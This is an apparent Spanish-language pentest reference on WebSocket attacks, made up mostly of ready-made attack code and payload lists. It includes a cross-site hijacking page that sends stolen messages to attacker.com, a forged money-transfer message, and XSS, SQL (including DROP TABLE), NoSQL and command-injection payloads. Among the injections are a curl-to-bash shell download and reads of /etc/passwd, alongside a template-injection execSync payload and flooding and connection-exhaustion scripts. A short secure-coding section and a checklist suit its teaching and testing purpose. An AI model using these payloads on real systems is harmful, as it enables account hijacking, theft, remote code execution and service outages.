# 🔌 Guía de referencia de ataques WebSocket

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](WebSocket-Attacks.tr.md) • [🇬🇷 Ελληνικά](WebSocket-Attacks.el.md)

```
██╗    ██╗███████╗██████╗ ███████╗ ██████╗  ██████╗██╗  ██╗███████╗████████╗
██║    ██║██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
██║ █╗ ██║█████╗  ██████╔╝███████╗██║   ██║██║     █████╔╝ █████╗     ██║   
██║███╗██║██╔══╝  ██╔══██╗╚════██║██║   ██║██║     ██╔═██╗ ██╔══╝     ██║   
╚███╔███╔╝███████╗██████╔╝███████║╚██████╔╝╚██████╗██║  ██╗███████╗   ██║   
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗                   
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝                   
███████║   ██║      ██║   ███████║██║     █████╔╝ ███████╗                   
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║                   
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║                   
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝                   
```

---

## 🔍 Fundamentos de WebSocket

> **Contexto:** CSWSH requiere condiciones adicionales, como credenciales enviadas automáticamente y ausencia de protección suficiente entre sitios; la falta de validación de Origin no basta por sí sola. Los recorridos de menús y las etiquetas del navegador se conservan literalmente en inglés. Los fragmentos JSON con comentarios no son mensajes JSON válidos hasta retirar esos comentarios.

### Solicitud de negociación
```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

### Respuesta de negociación
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### Detección
```
- ws:// (sin cifrar)
- wss:// (cifrado mediante TLS)
- Cabecera Upgrade: websocket
- La pestaña Network muestra "101 Switching Protocols"
```

---

## 🎯 Vulnerabilidades de WebSocket

### 1. Secuestro de WebSocket entre sitios (CSWSH)

**Condición vulnerable:** El servidor no valida la cabecera Origin

```html
<!-- Página del atacante -->
<script>
  var ws = new WebSocket('wss://target.com/chat');
  
  ws.onopen = function() {
    // Conexión abierta: el atacante puede enviar mensajes
    ws.send('{"action": "get_messages"}');
  };
  
  ws.onmessage = function(event) {
    // Robar datos y enviarlos al atacante
    fetch('https://attacker.com/steal?data=' + btoa(event.data));
  };
</script>
```

**Ataque de tipo CSRF:**
```html
<script>
  var ws = new WebSocket('wss://target.com/api');
  ws.onopen = function() {
    // Realizar acciones como la víctima
    ws.send('{"action": "transfer", "to": "attacker", "amount": 1000}');
  };
</script>
```

---

### 2. Falta de validación de Origin

**Pruebas:**
```bash
# Usar wscat
wscat -c wss://target.com/ws -H "Origin: https://evil.com"

# Usar websocat
websocat -H "Origin: https://evil.com" wss://target.com/ws
```

**Explotación:**
```javascript
// Si el servidor acepta cualquier origen
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send('{"action": "sensitive_operation"}');
```

---

### 3. Evasión de autenticación

**Conexión WebSocket sin autenticación:**
```javascript
// Conectarse sin cookies ni tokens
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  ws.send('{"action": "list_users"}');  // ¿No se requiere autenticación?
};
```

**Token en la URL (riesgo de filtración):**
```
wss://target.com/ws?token=SECRET_TOKEN
// El token puede filtrarse en registros o cabeceras de referencia
```

**Probar distintos estados de autenticación:**
```javascript
// Probar con un token caducado
// Probar con un token modificado
// Probar sin token
// Probar con el token de otro usuario
```

---

### 4. Ataques de inyección mediante WebSocket

**XSS mediante WebSocket:**
```javascript
// Enviar un payload XSS
ws.send('{"message": "<script>alert(document.cookie)</script>"}');
ws.send('{"message": "<img src=x onerror=alert(1)>"}');
```

**Inyección SQL:**
```javascript
ws.send('{"query": "\' OR 1=1--"}');
ws.send('{"id": "1 UNION SELECT username,password FROM users--"}');
```

**Inyección de comandos:**
```javascript
ws.send('{"cmd": "ping 127.0.0.1; id"}');
ws.send('{"file": "test.txt; cat /etc/passwd"}');
```

**Inyección NoSQL:**
```javascript
ws.send('{"username": {"$ne": ""}, "password": {"$ne": ""}}');
```

---

### 5. Ataques de denegación de servicio (DoS)

**Inundación de mensajes:**
```javascript
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  setInterval(() => {
    ws.send('x'.repeat(10000));  // Mensajes grandes
  }, 1);
};
```

**Agotamiento de conexiones:**
```python
import websocket
import threading

def connect():
    ws = websocket.WebSocket()
    ws.connect("wss://target.com/ws")
    while True:
        pass  # Mantener la conexión abierta

for i in range(1000):
    threading.Thread(target=connect).start()
```

---

### 6. Manipulación de datos

**Manipulación de mensajes:**
```javascript
// Interceptar y modificar mensajes
// Usar la interceptación WebSocket de Burp Suite

// Original
{"action": "transfer", "amount": 10, "to": "user123"}

// Modificado
{"action": "transfer", "amount": 10000, "to": "attacker"}
```

**Condiciones de carrera:**
```javascript
// Enviar varias solicitudes rápidas
for(let i = 0; i < 100; i++) {
  ws.send('{"action": "claim_bonus"}');
}
```

---

## 🛠️ Herramientas de prueba

### Burp Suite
```
1. Proxy → WebSockets history
2. Right-click → Send to Repeater
3. Modificar y reenviar los mensajes
4. Activar "Auto-scroll to end"
```

### wscat (CLI)
```bash
# Instalar
npm install -g wscat

# Conectarse
wscat -c wss://target.com/ws

# Con cabeceras
wscat -c wss://target.com/ws -H "Cookie: session=abc123"
wscat -c wss://target.com/ws -H "Authorization: Bearer TOKEN"

# Con origen
wscat -c wss://target.com/ws -o "https://target.com"
```

### websocat
```bash
# Instalar
cargo install websocat

# Conectarse
websocat wss://target.com/ws

# Con cabeceras
websocat -H "Origin: https://evil.com" wss://target.com/ws
websocat -H "Cookie: session=abc" wss://target.com/ws
```

### Script de pruebas en Python
```python
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    # Probar payloads
    ws.send('{"action": "test"}')
    ws.send('{"action": "get_users", "id": "1 OR 1=1"}')

ws = websocket.WebSocketApp(
    "wss://target.com/ws",
    header={"Origin": "https://evil.com"},
    cookie="session=abc123",
    on_message=on_message,
    on_open=on_open
)
ws.run_forever()
```

### Herramientas de desarrollo del navegador
```javascript
// Observar el tráfico WebSocket
// F12 → Network → WS filter

// Pruebas manuales
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = (e) => console.log('Received:', e.data);
ws.onopen = () => ws.send('test');
```

---

## 💉 Colección de payloads

### Pruebas de autenticación
```json
// Sin autenticación
{"action": "get_secret_data"}

// Token vacío
{"token": "", "action": "admin_action"}

// Token nulo
{"token": null, "action": "delete_user"}
```

### Payloads XSS
```json
{"message": "<script>alert('XSS')</script>"}
{"message": "<img src=x onerror=alert(1)>"}
{"name": "<svg onload=alert(1)>"}
{"data": "'-alert(1)-'"}
```

### Payloads SQLi
```json
{"id": "1' OR '1'='1"}
{"user": "admin'--"}
{"search": "1 UNION SELECT password FROM users--"}
{"filter": "1; DROP TABLE users--"}
```

### Inyección de comandos
```json
{"host": "localhost; id"}
{"file": "test.txt | cat /etc/passwd"}
{"cmd": "`whoami`"}
{"input": "$(curl attacker.com/shell.sh | bash)"}
```

### Recorrido de directorios (path traversal)
```json
{"file": "../../../etc/passwd"}
{"path": "....//....//etc/passwd"}
{"template": "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}"}
```

---

## 📋 Lista de comprobación de pruebas

```markdown
## Lista de comprobación de seguridad WebSocket

□ Identificar endpoints WebSocket
□ Comprobar la validación de la cabecera Origin
□ Probar CSWSH (secuestro de WebSocket entre sitios)
□ Probar los requisitos de autenticación
□ Comprobar si los tokens se transmiten de forma segura
□ Probar vulnerabilidades de inyección (XSS, SQLi, etc.)
□ Probar la autorización (acceso a datos de otros usuarios)
□ Comprobar la limitación de solicitudes
□ Probar los límites de tamaño de mensajes
□ Buscar exposición de datos sensibles
□ Probar la gestión de conexiones y reconexiones
□ Comprobar el cifrado (wss:// frente a ws://)
```

---

## 🔐 Implementación segura

> **Fragmento esquemático:** el ejemplo no es un servidor completo: mezcla objetos de conexión, presupone funciones externas y no captura errores de `JSON.parse`. La autenticación y autorización deben aplicarse al contexto de cada mensaje. Se conserva el código original para señalar sus límites.

```javascript
// Validación de Origin en el servidor
if (request.headers.origin !== 'https://trusted-site.com') {
  socket.close(1008, 'Invalid origin');
  return;
}

// Autenticación basada en tokens
socket.on('connection', function(ws, req) {
  const token = req.url.split('token=')[1];
  if (!validateToken(token)) {
    ws.close(1008, 'Invalid token');
  }
});

// Validación de entradas
socket.on('message', function(data) {
  const parsed = JSON.parse(data);
  if (!isValidInput(parsed)) {
    socket.send(JSON.stringify({error: 'Invalid input'}));
    return;
  }
});
```

---

## 🔗 Payloads relacionados

- [Payloads XSS](./XSS.es.md)
- [Payloads SQLi](./SQLi.es.md)
- [Inyección de comandos](./Command-Injection.es.md)

---

**Volver a los payloads:** [💉 Colección de payloads](../../README.md#-payloads-collection)
